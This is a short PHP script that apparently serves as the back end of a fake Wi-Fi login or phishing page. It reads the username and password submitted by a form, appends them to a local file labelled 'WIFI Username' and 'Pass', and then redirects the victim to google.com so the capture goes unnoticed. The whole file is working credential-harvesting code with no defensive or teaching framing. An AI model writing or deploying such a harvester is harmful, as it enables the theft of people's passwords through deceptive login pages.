<?php
    file_put_contents("../userpass/usernames.txt", "WIFI Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://google.com');
exit();
